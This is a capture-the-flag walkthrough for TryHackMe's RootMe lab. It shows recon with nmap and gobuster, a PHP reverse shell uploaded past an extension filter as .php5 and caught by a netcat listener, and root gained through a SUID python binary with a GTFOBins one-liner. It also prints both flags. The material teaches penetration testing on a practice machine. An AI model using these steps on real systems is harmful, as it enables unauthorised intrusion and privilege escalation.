# - RootMe -

##

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FxhbF5RVHcMC2wjuARwbv%2Fimage.png?alt=media&#x26;token=940a5537-23ee-4af5-9836-add532a70f7e" alt="" width="175"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure></div>

#### 🔗 [RootMe](https://tryhackme.com/room/rrootme)

#### Task 1 - Deploy the machine

🎯 Target IP: `10.10.55.36`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

#### Task 2 - Reconnaissance

```bash
su
echo "10.10.55.36 rootme.thm" >> /etc/hosts

mkdir thm/rootme
cd thm/rootme

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 rootme.thm
```

```bash
PING rootme.thm (10.10.55.36) 56(84) bytes of data.
64 bytes from rootme.thm (10.10.55.36): icmp_seq=1 ttl=63 time=79.6 ms
64 bytes from rootme.thm (10.10.55.36): icmp_seq=2 ttl=63 time=60.2 ms
64 bytes from rootme.thm (10.10.55.36): icmp_seq=3 ttl=63 time=58.5 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

**2.1 - Scan the machine, how many ports are open?**

```bash
nmap --open rootme.thm
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 23:28 CEST
Nmap scan report for rootme.thm (10.10.55.36)
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> 2 ports open

**2.2 - What version of Apache is running?**

```bash
nmap -p22,80 -sV -sC -Pn -oA rootme_scan rootme.thm 
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 23:42 CEST
Nmap scan report for rootme.thm (10.10.55.36)
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

> Apache httpd 2.4.29 ((Ubuntu))

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FgdVFOetVhFfigUrsv0wd%2FSchermata%20del%202023-05-31%2020-18-46.png?alt=media&#x26;token=40818246-3e98-49d6-85d1-6381baa68429" alt=""><figcaption><p>rootme.thm:80</p></figcaption></figure>

**2.3 - What service is running on port 22?**

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

> SSH service is running on port 22

**2.4 - Find directories on the web server using the GoBuster tool.**

The website (port 80) does not have much functionality. Next, we can run a gobuster scan to look for hidden files and directories using the dirb/common.txt wordlist.

```bash
gobuster dir -u rootme.thm -w /usr/share/wordlists/dirb/common.txt  
```

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rootme.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/31 20:11:14 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/css                  (Status: 301) [Size: 306] [--> http://rootme.thm/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 305] [--> http://rootme.thm/js/]
/panel                (Status: 301) [Size: 308] [--> http://rootme.thm/panel/]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://rootme.thm/uploads/]
Progress: 4568 / 4615 (98.98%)
===============================================================
```

**2.5 - What is the hidden directory?**

```
/panel                (Status: 301) [Size: 308] [--> http://rootme.thm/panel/]
```

> /panel/

#### Task 3 - Getting a shell

**3.1 - Find a form to upload and get a reverse shell, and find the flag (user.txt).**

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FVcOcQZ9fnBCtz7iqABnT%2FSchermata%20del%202023-05-31%2020-20-50.png?alt=media&#x26;token=84838840-5b3c-46a5-82c4-5aa827066983" alt=""><figcaption><p>rootme.thm/panel/</p></figcaption></figure>

During an offensive engagement, upload forms present excellent opportunities to exploit potential vulnerabilities. One of the first things to try is uploading a reverse shell.\
\
Uploading a reverse shell requires a few steps:

1. Successfully upload a reverse shell script
2. Start a listener
3. Get the reverse shell script to run (note that the /uploads directory was found by the gobuster scan)

Apache servers use PHP, so we can search google for an Apache or PHP reverse shell script in order to progress. The first result I got was the Pentest Monkey PHP reverse shell:

[https://github.com/pentestmonkey/php-reverse-](https://github.com/pentestmonkey/php-reverse-shell)[shell](https://github.com/pentestmonkey/php-reverse-shell)

You can get the shell script in any manner of your choosing. One easy way is to copy the raw data, paste it into a text editor, and save it.

In order for the reverse shell to work, you need change the IP address to that of your attacker machine (the AttackBox IP address if you’re using it). The port also needs to be specified and needs to be the same as the port that we set on the listener (in the next step):

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F2HoUZ3UDb6DOUP7zUUax%2FSchermata%20del%202023-06-02%2012-44-27.png?alt=media&#x26;token=5e234cc6-64fe-49a2-a393-e517621a5f25" alt=""><figcaption><p>Modify php code with our IP target and port (value at our choice).</p></figcaption></figure>

Next, return to a terminal and start a netcat listener using the **nc** command:

```bash
nc -lvnp <port>
```

Make sure that the port number you specify for the listener is the same as the one in the PHP reverse shell:

```bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
```

Running a NetCat listener.

Now that the listener is active, let’s try uploading a shell. I saved it as ‘reverse\_shell.php’ and tried uploading it as is, but this was denied:

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FeEwXnPHYUkRfvxBUNT0N%2FSchermata%20del%202023-06-02%2017-07-37.png?alt=media&#x26;token=2dc1bac3-02ac-4397-80b5-b44bf8fca593" alt=""><figcaption></figcaption></figure>

Looks like PHP is ‘not permitted’. We’ll have to bypass the restrictions that have been set.

The first primary strategy for identifying a file upload vulnerability is by manipulating the file extension. There is a good list at hacktricks ([https://book.hacktricks.xyz/pentesting-web/file-upload](https://book.hacktricks.xyz/pentesting-web/file-upload)).\
\
I used the following list:\
\
_&#x70;hp_\
_&#x70;hp2_\
_&#x70;hp3_\
_&#x70;hp4_\
_&#x70;hp5_\
_&#x70;hp6_\
_&#x70;hp7_\
phps\
_&#x70;hps_\
_&#x70;ht_\
_&#x70;htm_\
_&#x70;html_\
_&#x70;gif_\
_&#x73;html_\
_&#x68;taccess_\
_&#x70;har_\
_&#x69;nc_\
_&#x68;php_\
_&#x63;tp_\
_&#x6D;odulea_

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fu699YGEhhX7qwpmN8IaB%2FSchermata%20del%202023-06-02%2016-13-47.png?alt=media&#x26;token=44d708b6-d813-43aa-a6b9-3949e649193c" alt=""><figcaption></figcaption></figure>

Add list in payload options.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FqNY4k8Pcqvsk6Nly9aML%2FSchermata%20del%202023-06-02%2013-19-43.png?alt=media&#x26;token=5f20f16f-6165-4ba6-9c4d-d17c7edeb8ce" alt=""><figcaption></figcaption></figure>

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FiJ7vHsNl2ffv3e5WF7IX%2FSchermata%20del%202023-06-02%2016-20-23.png?alt=media&#x26;token=15f3ba49-6910-46b1-bdae-7b8df920018b" alt=""><figcaption><p>We can set file with .php5 extension and upload it.</p></figcaption></figure>

Now navigate to path /uploads and we will see our payload there now click on it to execute it, and we have our shell in our Netcat listener

```bash
nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.9.80.228] from (UNKNOWN) [10.10.55.36] 53476
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:33:46 up 7 min,  0 users,  load average: 0.38, 1.58, 1.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
```

Navigate to /var/www/user.txt

```bash
$ cd var/www
$ ls
html
user.txt
$ cat user.txt
```

<details>

<summary>🚩 user.txt [Flag]</summary>

THM{y0u\_g0t\_a\_sh3ll}

</details>

#### Task 4 - Privilege escalation

**4.1 - Search for files with SUID permission, which file is weird?**

Now that we are on the target machine, we need to look for ways to escalate our privileges. Using our next question as a hint we need to search for files with SUID permissions. To do this we can run the command:

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

> /usr/bin/python

**4.2 - Find a form to escalate your privileges.**

Now here we will search our gtfobins to search for any binary and I found this: [https://gtfobins.github.io/gtfobins/python/](https://gtfobins.github.io/gtfobins/python/)

Write this code in your shell:

```bash
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**4.3 - root.txt \[flag]**

Navigate to the root directory and we will find our root flag.

```bash
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd root
ls
root.txt
cat root.txt
```

<details>

<summary>🚩 root.txt [Flag]</summary>

THM{pr1v1l3g3\_3sc4l4t10n}

</details>
